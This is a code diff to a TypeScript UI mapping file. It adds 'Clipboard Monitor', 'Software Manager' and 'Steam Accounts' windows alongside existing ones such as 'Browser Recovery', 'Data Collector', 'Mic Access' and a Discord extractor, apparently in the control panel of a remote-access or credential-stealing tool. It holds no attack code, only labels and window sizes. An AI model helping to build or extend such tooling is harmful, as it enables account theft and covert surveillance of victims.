@@ -44,6 +44,12 @@ const translateWindowType = (type: string) => {
       return "Browser Recovery";
     case "data-collector":
       return "Data Collector";
+    case "clipboard":
+      return "Clipboard Monitor";
+    case "software":
+      return "Software Manager";
+    case "steam-account":
+      return "Steam Accounts";
     case "mic-access":
       return "Mic Access";
     case "desktop-recording":
@@ -103,6 +109,18 @@ const windowTypeSizes = {
   "data-collector": {
     width: 1200,
     height: 900,
+  },
+  clipboard: {
+    width: 1100,
+    height: 800,
+  },
+  software: {
+    width: 1200,
+    height: 900,
+  },
+  "steam-account": {
+    width: 1200,
+    height: 800,
   },
   "discord-extractor": {
     width: 1000,
